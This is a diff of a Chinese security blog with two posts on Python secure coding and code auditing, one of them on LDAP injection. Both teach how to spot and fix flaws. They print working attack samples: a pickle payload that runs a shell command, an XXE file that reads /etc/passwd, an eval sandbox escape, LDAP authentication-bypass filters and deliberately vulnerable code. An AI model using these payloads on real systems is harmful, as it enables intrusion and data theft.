+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/Python安全编码&代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/Python安全编码&代码审计/" itemprop="url">
+                  Python安全编码&代码审计
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/Python安全编码&代码审计/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/Python安全编码&代码审计/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/Python安全编码&代码审计/" class="leancloud_visitors" data-flag-title="Python安全编码&代码审计">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>现在一般的web开发框架安全已经做的挺好的了，比如大家常用的django，但是一些不规范的开发方式还是会导致一些常用的安全问题，下面就针对这些常用问题做一些总结。代码审计准备部分见《php代码审计》，这篇文档主要讲述各种常用错误场景，基本上都是咱们自己的开发人员犯的错误，敏感信息已经去除。</p>
+<h1 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2 XSS"></a>2 XSS</h1><p>未对输入和输出做过滤，场景：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss_test</span><span class="params">(request)</span>:</span></div><div class="line">    name = request.GET[<span class="string">'name'</span>]</div><div class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'hello %s'</span> %(name))</div></pre></td></tr></table></figure></p>
+<p>在代码中一搜，发现有大量地方使用，比较正确的使用方式如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss_test</span><span class="params">(request)</span>:</span></div><div class="line">    name = request.GET[<span class="string">'name'</span>]</div><div class="line">    <span class="comment">#return HttpResponse('hello %s' %(name))</span></div><div class="line">    <span class="keyword">return</span> render_to_response(<span class="string">'hello.html'</span>, &#123;<span class="string">'name'</span>:name&#125;)</div></pre></td></tr></table></figure></p>
+<p>更好的就是对输入做限制，比如说一个正则范围，输出使用正确的api或者做好过滤。  </p>
+<h1 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3 CSRF"></a>3 CSRF</h1><p>对系统中一些重要的操作要做CSRF防护，比如登录，关机，扫描等。django 提供CSRF中间件<code>django.middleware.csrf.CsrfViewMiddleware</code>,写入到settings.py的中间件即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_view</span><span class="params">(request)</span>:</span></div><div class="line">    c = &#123;&#125;</div><div class="line">    c.update(csrf(request))</div><div class="line">    <span class="comment"># ... view code here</span></div><div class="line">    <span class="keyword">return</span> render_to_response(<span class="string">"a_template.html"</span>, c)</div></pre></td></tr></table></figure></p>
+<h1 id="4-命令注入"><a href="#4-命令注入" class="headerlink" title="4 命令注入"></a>4 命令注入</h1><p>审计代码过程中发现了一些编写代码的不好的习惯，体现最严重的就是在命令注入方面，本来python自身的一些函数库就能完成的功能，偏偏要调用os.system来通过shell 命令执行来完成，老实说最烦这种写代码的啦。下面举个简单的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> <span class="function"><span class="keyword">def</span> <span class="title">myserve</span><span class="params">(request, filename, dirname)</span>:</span></div><div class="line">    re = serve(request=request,path=filename,document_root=dirname,show_indexes=<span class="keyword">True</span>)</div><div class="line">    filestr=<span class="string">'authExport.dat'</span> </div><div class="line">    re[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename="'</span> + urlquote(filestr) +<span class="string">'"'</span>fullname=os.path.join(dirname,filename)</div><div class="line">    os.system(<span class="string">'sudo rm -f %s'</span>%fullname)</div><div class="line">    <span class="keyword">return</span> re</div></pre></td></tr></table></figure></p>
+<p>很显然这段代码是存在问题的，因为fullname是用户可控的。正确的做法是不使用os.system接口，改成python自有的库函数，这样就能避免命令注入。python的三种删除文件方式：<br>（1）shutil.rmtree 删除一个文件夹及所有文件<br>（2）os.rmdir 删除一个空目录<br>（3）os.remove，unlink 删除一个文件</p>
+<p>使用了上述接口之后还得注意不能穿越目录，不然整个系统都有可能被删除了。常见的存在命令执行风险的函数如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.system,os.popen,os.spaw*,os.<span class="keyword">exec</span>*,os.open,os.popen*,commands.call,commands.getoutput,Popen*</div></pre></td></tr></table></figure></p>
+<p>推荐使用subprocess模块，同时确保shell=True未设置，否则也是存在注入风险的。</p>
+<h1 id="5-sql注入"><a href="#5-sql注入" class="headerlink" title="5 sql注入"></a>5 sql注入</h1><p>如果是使用django的api去操作数据库就应该不会有sql注入了，但是因为一些其他原因使用了拼接sql，就会有sql注入风险。下面贴一个有注入风险的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUsers</span><span class="params">(user_id=None)</span>:</span></div><div class="line">    conn = psycopg2.connect(<span class="string">"dbname='××' user='××' host='' password=''"</span>)</div><div class="line">    cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)</div><div class="line">    <span class="keyword">if</span> user_id==<span class="keyword">None</span>:</div><div class="line">        str = <span class="string">'select distinct * from auth_user'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        str=<span class="string">'select distinct * from auth_user where id=%s'</span>%user_id</div><div class="line">    res = cur.execute(str)</div><div class="line">    res = cur.fetchall()</div><div class="line">    conn.close()</div><div class="line">    <span class="keyword">return</span> res</div><div class="line">```  </div><div class="line">像这种sql拼接就有sql注入问题，正常情况下应该使用django的数据库api，如果实在有这方面的需求，可以按照如下方式写：  </div><div class="line">```python</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_contacts</span><span class="params">(request)</span>:</span></div><div class="line">  user = request.GET[<span class="string">'username'</span>]</div><div class="line">  sql = <span class="string">"SELECT * FROM user_contacts WHERE username = %s"</span></div><div class="line">  cursor = connection.cursor()</div><div class="line">  cursor.execute(sql, [user])</div><div class="line"><span class="comment"># do something with the results</span></div><div class="line">  results = cursor.fetchone()   <span class="comment">#or  results = cursor.fetchall()</span></div><div class="line">  cursor.close()</div><div class="line">```  </div><div class="line">直接拼接的是万万不可的，如果采用ModelInstance.objects.raw(sql,[]),或者connection.objects.execute(sql,[]) ,通过列表传进去的参数是没有注入风险的，因为django会有处理。</div><div class="line"></div><div class="line"><span class="comment"># 6 代码执行  </span></div><div class="line">一般是由于eval和pickle.loads的滥用造成的，特别是eval，大家都没有意识到这方面的问题。下面举个代码中的例子：</div><div class="line">```python</div><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="meta">@permission_required("accounts.newTask_assess")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">targetLogin</span><span class="params">(request)</span>:</span></div><div class="line">    req = simplejson.loads(request.POST[<span class="string">'loginarray'</span>])</div><div class="line">    req=unicode(req).encode(<span class="string">"utf-8"</span>)</div><div class="line">    loginarray=eval(req)</div><div class="line">    ip=_e(request,<span class="string">'ipList'</span>)</div><div class="line">    <span class="comment">#targets=base64.b64decode(targets)</span></div><div class="line">    (iplist1,iplist2)=getIPTwoList(ip)</div><div class="line">    iplist1=list(set(iplist1))</div><div class="line">    iplist2=list(set(iplist2))</div><div class="line">    loginlist=[]</div><div class="line">    delobjs=[]</div><div class="line">    holdobjs=[]</div></pre></td></tr></table></figure></p>
+<p>这一段代码就是就是因为eval的参数不可控，导致任意代码执行，正确的做法就是literal.eval接口。再取个pickle.loads的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> cPickle</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cPickle.loads(<span class="string">"cos\nsystem\n(S'uname -a'\ntR."</span>)</div><div class="line">Linux RCM-RSAS-V6-Dev <span class="number">3.9</span><span class="number">.0</span>-aurora <span class="comment">#4 SMP PREEMPT Fri Jun 7 14:50:52 CST 2013 i686 Intel(R) Core(TM) i7-2600 CPU @ 3.40GHz GenuineIntel GNU/Linux</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure></p>
+<h1 id="7-文件操作"><a href="#7-文件操作" class="headerlink" title="7 文件操作"></a>7 文件操作</h1><p>文件操作主要包含任意文件下载，删除，写入，覆盖等，如果能达到写入的目的时基本上就能写一个webshell了。下面举个任意文件下载的例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@login_required</span></div><div class="line"><span class="meta">@permission_required("accounts.newTask_assess")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportLoginCheck</span><span class="params">(request,filename)</span>:</span></div><div class="line">    <span class="keyword">if</span> re.match(r“*.lic”，filename):</div><div class="line">        fullname = filename</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        fullname = <span class="string">"/tmp/test.lic"</span></div><div class="line">    <span class="keyword">print</span> fullname</div><div class="line">    <span class="keyword">return</span> HttpResponse(fullname)</div></pre></td></tr></table></figure></p>
+<p>这段代码就存在着任意.lic文件下载的问题，没有做好限制目录穿越，同理</p>
+<h1 id="8-文件上传"><a href="#8-文件上传" class="headerlink" title="8 文件上传"></a>8 文件上传</h1><h2 id="8-1-任意文件上传"><a href="#8-1-任意文件上传" class="headerlink" title="8.1 任意文件上传"></a>8.1 任意文件上传</h2><p>这里主要是未限制文件大小，可能导致ddos，未限制文件后缀，导致任意文件上传，未给文件重命名，可能导致目录穿越，文件覆盖等问题。</p>
+<h2 id="8-2-xml，excel等上传"><a href="#8-2-xml，excel等上传" class="headerlink" title="8.2 xml，excel等上传"></a>8.2 xml，excel等上传</h2><p>在我们的产品中经常用到xml来保存一些配置文件，同时也支持xml文件的导出导入，这样在libxml2.9以下就可能导致xxe漏洞。就拿lxml来说吧：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@kali:~/python# cat test.xml</div><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line">&lt;!DOCTYPE xdsec [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</div><div class="line">]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">    &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid="" /&gt;test&amp;xxe;&lt;/root&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; from lxml import etree</div><div class="line">&gt;&gt;&gt; tree1 = etree.parse('test.xml')</div><div class="line">&gt;&gt;&gt; print etree.tostring(tree1.getroot())</div><div class="line">&lt;root&gt;</div><div class="line">    &lt;node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid=""/&gt;testroot:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div><div class="line">bin:x:2:2:bin:/bin:/bin/sh</div><div class="line">sys:x:3:3:sys:/dev:/bin/sh</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/bin/sh</div><div class="line">man:x:6:12:man:/var/cache/man:/bin/sh</div></pre></td></tr></table></figure></p>
+<p>这是因为在lxml中默认采用的XMLParser导致的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">class XMLParser(_FeedParser)</div><div class="line">|  XMLParser(self, encoding=None, attribute_defaults=False, dtd_validation=False, load_dtd=False, no_network=True, ns_clean=False, recover=False, XMLSchema schema=None, remove_blank_text=False, resolve_entities=True, remove_comments=False, remove_pis=False, strip_cdata=True, target=None, compact=True)</div></pre></td></tr></table></figure></p>
+<p>关注其中两个关键参数，其中resolve_entities=True,no_network=True,其中resolve_entities=True会导致解析实体，no_network会为True就导致了该利用条件比较有效，会导致一些ssrf问题，不能将数据带出。在python中xml.dom.minidom,xml.etree.ElementTree不受影响</p>
+<h1 id="9-不安全的封装"><a href="#9-不安全的封装" class="headerlink" title="9 不安全的封装"></a>9 不安全的封装</h1><h2 id="9-1-eval-封装不彻底"><a href="#9-1-eval-封装不彻底" class="headerlink" title="9.1 eval 封装不彻底"></a>9.1 eval 封装不彻底</h2><p>仅仅是将<code>__builtings__</code>置为空，如下方式即可绕过,可参见<a href="http://bugzilla.intra.nsfocus.com/show_bug.cgi?id=84179" target="_blank" rel="external">bug84179</a></p>
+<pre><code class="python"><span class="meta">&gt;&gt;&gt; </span>s2=<span class="string">"""
+<span class="meta">... </span>[x for x in ().__class__.__bases__[0].__subclasses__()
+<span class="meta">... </span>   if x.__name__ == "zipimporter"][0](
+<span class="meta">... </span>     "/home/xxlegend/eval_test/configobj-4.4.0-py2.5.egg").load_module(
+<span class="meta">... </span>     "configobj").os.system("uname")
+<span class="meta">... </span>"""</span>
+<span class="meta">&gt;&gt;&gt; </span>eval(s2,{<span class="string">'__builtins__'</span>:{}})
+Linux
+<span class="number">0</span>
+</code></pre>
+<h2 id="9-2-执行命令接口封装不彻底"><a href="#9-2-执行命令接口封装不彻底" class="headerlink" title="9.2 执行命令接口封装不彻底"></a>9.2 执行命令接口封装不彻底</h2><p>在底层封装函数没有过滤shell元字符，仅仅是限定一些命令，但是其参数未做控制，可参见<a href="http://bugzilla.intra.nsfocus.com/show_bug.cgi?id=86011" target="_blank" rel="external">bug86011</a> </p>
+<h1 id="10-总结"><a href="#10-总结" class="headerlink" title="10 总结"></a>10 总结</h1><p>一切输入都是不可靠的，做好严格过滤。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/01/Python安全编码之预防LDAP注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xxlegend">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/04/01/Python安全编码之预防LDAP注入/" itemprop="url">
+                  Python安全编码之预防LDAP注入
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-01T15:38:36+08:00">
+                2017-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/01/Python安全编码之预防LDAP注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/04/01/Python安全编码之预防LDAP注入/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/01/Python安全编码之预防LDAP注入/" class="leancloud_visitors" data-flag-title="Python安全编码之预防LDAP注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="1-LDAP简介"><a href="#1-LDAP简介" class="headerlink" title="1 LDAP简介"></a>1 LDAP简介</h2><p>LDAP（Lightweight Directory Access Protocol）轻量级目录协议，是一种在线目录访问协议，主要用于资源查询，是X.500的一种简便的实现。它是一种树结构，查询效率很高，插入效率稍低。目录和数据库有很多相似之处，都用于存放数据，可以查询插入，目录可以存放各种数据，而数据库的数据则有比较严格的约束条件。<br>LDAP目录以入口(entry，目录中存储的基本信息单元)的形式存储和组织数据结构，每个入口有一个唯一标示自己的专属名称(distnguished name)，DN由系列RDNs(ralative distinguished names)组成。另外还有两个常见的结构，对象类和属性。对象类(object class)会定义独一的OID，每个属性(attribute)也会分配唯一的OID号码。</p>
+<h2 id="2-LDAP注入原理"><a href="#2-LDAP注入原理" class="headerlink" title="2 LDAP注入原理"></a>2 LDAP注入原理</h2><p>谈起LDAP注入首先得从LDAP的查询语法开始，基本的查询语法如下：<br>search语法：attribute operator value</p>
+<p>　　 <code>search filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></p>
+<p> 　主要根据属性和值进行搜索，就如浏览网页时我们通常并不会浏览某个目录，而是其下存在的某个文件。<br> 　　LDAP的URL形式为：<code>ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]]</code><br>　　 例如： <code>ldap://austin.ibm.com/ou=Austin,o=IBM</code> </p>
+<h3 id="2-1-注入过程"><a href="#2-1-注入过程" class="headerlink" title="2.1 注入过程"></a>2.1 注入过程</h3><p>从注入原理来看，ldap注入分为and注入和or注入，先看and注入情形，假设查询结构如下<code>(&amp;(user=username)(passwd=password))</code>,这可能是采用采用LDAP进行登录验证的查询语句，其中username和password都是用户可控制的参数，那么可以在user处注入<code>admin*)(objectClass=*)</code>形成如下<br><code>(&amp;(user=admin*)(objectClass=*))(passwd=password))</code> 有点小语法错误，如果在user处注入<code>admin*)(objectClass=*))(&amp;(objectClass=*</code><br><code>(&amp;(user=admin*)(objectClass=*))(|(objectClass=void)(passwd=passwd))</code> 无语法错误,对于openldap来说，只会执行第一个&amp;括号内的内容，由于objectClass=*恒为真，我们就能无需密码以admin用户的身份登录系统<br>如果不允许两个过滤服务器的执行，则是<br><code>(&amp;(user=username)(injected_filter)(passwd=password))</code></p>
+<p>对于or注入，查询表达式如下：<br><code>(|(user=username)(email=email_addr))</code><br>假如username可控，即可注入<br><code>username*)(objectClass=void))(|objectClass=void</code><br>形成<br><code>(|(user=username)(objectClass=void))(|objectClass=void)(email=email_addr))</code>,由于objectClass=void恒为假，所以只有user=username的时候整个值为真。</p>
+<h3 id="2-2-渗透技巧"><a href="#2-2-渗透技巧" class="headerlink" title="2.2 渗透技巧"></a>2.2 渗透技巧</h3><p>对于渗透测试来说，还是要看报错，比如输入<code>\</code>,如果关闭了报错接口，可以通过正确参数后加”<em>“字符，如果返回一致，必有蹊跷，很有可能就是一个注入点，接着就可以尝试盲注的方式，简单的盲注就是”</em>a*”这种方式。</p>
+<h3 id="2-3-调试与验证"><a href="#2-3-调试与验证" class="headerlink" title="2.3 调试与验证"></a>2.3 调试与验证</h3><p>在代码审计过程中，有些时候代码结构庞大，为了验证是否存在注入点，不好直接改写在python命令行中执行，那么就可以尝试打开ldap的日志，这样直接从url参数中加入注入元素，就能很好的观察注入的效果。下面是打开ldap日志的方法。一般的文章中都是打开syslogd，如果已经替换成了rsyslogd，也不要惊慌。rsyslogd是syslogd的升级包，原来的配置文件都还可用，增加了很多新功能，如能监听端口或者IP。下面就是打开LDAP日志的步骤：</p>
+<p>1.在slapd.conf中加一行：</p>
+<figure class="highlight plain"><figcaption><span>4095 ```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.在/etc/rsyslog.conf 中加入ldap日志文档：</div><div class="line"></div><div class="line">```local4.* /var/log/ldap.log</div></pre></td></tr></table></figure>
+<p>3.在终端用命令重启syslog服务</p>
+<figure class="highlight plain"><figcaption><span>service rsyslog restart```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">4.在/var/log/下可以找到一个ldap.log文件</div><div class="line">随着时间增长，这个日志会增长较快，注意删除。</div><div class="line">有时候为了查看实际的搜索结果，可以下载ldap的相关工具，在windows下推荐使用LDAP Administrator，linux下可以使用ldapsearch工具，ldapsearch具体用法如下：</div><div class="line"></div><div class="line">```ldapsearch -h 10.5.5.5 -p 389 -D &apos;o=customer&apos; -W -x -b &quot;o=customer&quot; &quot;cn=645*&quot;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><figcaption><span>binddn  bind DN</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-W         prompt for bind password</div><div class="line">-x         Simple authentication</div><div class="line">-b basedn  base dn for search</div></pre></td></tr></table></figure>
+<h2 id="3-python-安全编码"><a href="#3-python-安全编码" class="headerlink" title="3 python 安全编码"></a>3 python 安全编码</h2><p>如何在python中防止LDAP注入呢？首先我们来看下简单的ldap连接，绑定再到查询的示例，这个查询是存在注入风险的，请不要模仿，请不要模仿，请不要模仿。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">In [70]: import ldap</div><div class="line">In [71]: l = ldap.initialize(&apos;ldap://10.5.0.220:389&apos;)</div><div class="line">In [76]: l.bind(&apos;LDAP_ROOTDN&apos;,&apos;LDAP_ROOTPW&apos;)</div><div class="line">Out[76]: 4</div><div class="line">In [77]: l.search_s(&apos;LDAP_ROOTDN&apos;,ldap.SCOPE_SUBTREE,&apos;(cn=645*)&apos;)</div><div class="line">Out[77]:</div><div class="line">[(&apos;cn=64502d93-a8ab-3ba1-991a-74cfde8cb333,cn=admin,o=3333049f-92d2-3c3a-91c2-6e1ef4c6a6bf,o=customer&apos;,.......</div></pre></td></tr></table></figure>
+<p>而且ldap的查询接口不像sql结果，有参数化查询，ldap的接口只能从参数过滤上做功夫来防止注入,但是好歹ldap提供了一个安全过滤接口ldap.filter.在这个接口中有escape_filter_chars函数，源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape_filter_chars</span><span class="params">(assertion_value,escape_mode=<span class="number">0</span>)</span>:</span></div><div class="line">  <span class="string">"""</span></div><div class="line">  Replace all special characters found in assertion_value</div><div class="line">  by quoted notation.</div><div class="line"></div><div class="line">  escape_mode</div><div class="line">      If 0 only special chars mentioned in RFC 4515 are escaped.</div><div class="line">      If 1 all NON-ASCII chars are escaped.</div><div class="line">      If 2 all chars are escaped.</div><div class="line">  """</div><div class="line">  <span class="keyword">if</span> escape_mode:</div><div class="line">    r = []</div><div class="line">    <span class="keyword">if</span> escape_mode==<span class="number">1</span>:</div><div class="line">      <span class="keyword">for</span> c <span class="keyword">in</span> assertion_value:</div><div class="line">        <span class="keyword">if</span> c &lt; <span class="string">'0'</span> <span class="keyword">or</span> c &gt; <span class="string">'z'</span> <span class="keyword">or</span> c <span class="keyword">in</span> <span class="string">"\\*()"</span>:</div><div class="line">          c = <span class="string">"\\%02x"</span> % ord(c)</div><div class="line">        r.append(c)</div><div class="line">    <span class="keyword">elif</span> escape_mode==<span class="number">2</span>:</div><div class="line">      <span class="keyword">for</span> c <span class="keyword">in</span> assertion_value:</div><div class="line">        r.append(<span class="string">"\\%02x"</span> % ord(c))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">raise</span> ValueError(<span class="string">'escape_mode must be 0, 1 or 2.'</span>)</div><div class="line">    s = <span class="string">''</span>.join(r)</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    s = assertion_value.replace(<span class="string">'\\'</span>, <span class="string">r'\5c'</span>)</div><div class="line">    s = s.replace(<span class="string">r'*'</span>, <span class="string">r'\2a'</span>)</div><div class="line">    s = s.replace(<span class="string">r'('</span>, <span class="string">r'\28'</span>)</div><div class="line">    s = s.replace(<span class="string">r')'</span>, <span class="string">r'\29'</span>)</div><div class="line">    s = s.replace(<span class="string">'\x00'</span>, <span class="string">r'\00'</span>)</div><div class="line">  <span class="keyword">return</span> s</div></pre></td></tr></table></figure>
